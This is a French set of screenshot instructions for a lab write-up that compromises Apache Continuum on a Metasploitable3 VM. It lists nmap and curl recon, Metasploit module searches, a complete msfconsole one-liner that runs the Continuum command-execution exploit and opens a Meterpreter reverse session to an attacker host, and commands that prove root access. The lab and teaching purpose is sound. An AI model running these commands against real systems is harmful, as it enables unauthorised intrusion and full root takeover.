# Captures — Apache Continuum RCE (MS3)

Consignes de capture pour `services/ms3-jetty-continuum.html`. Commandes identiques à
celles du write-up source : `ms3/jules/jetty-continuum.md`.

## 01-recon-404.png

```bash
nmap -sC -sV -p 8080 172.28.128.3
curl -s http://172.28.128.3:8080/
```

Encadrer en rouge : la ligne `/continuum ---> ... apache-continuum-1.4.2/apps/continuum/`.

## 02-recherche-module.png

```bash
searchsploit continuum
msfconsole -q -x "search continuum; exit"
msfconsole -q -x "info exploit/linux/http/apache_continuum_cmd_exec; exit"
```

Encadrer en rouge : `exploit/linux/http/apache_continuum_cmd_exec` et
`https://nvd.nist.gov/vuln/detail/CVE-2016-15057`.

## 03-exploit-session.png

```bash
msfconsole -q -x "use exploit/linux/http/apache_continuum_cmd_exec; set RHOSTS 172.28.128.3; set LHOST 172.28.128.1; set LPORT 4450; exploit -z; exit -y"
```

Encadrer en rouge : `Meterpreter session 1 opened` et la ligne `root @
metasploitable3-ub1404` dans `sessions -l`.

## 04-preuve-root.png

```bash
sessions -i 1 -c id
sessions -i 1 -c "uname -a"
```

Encadrer en rouge : `uid=0(root) gid=0(root)`.
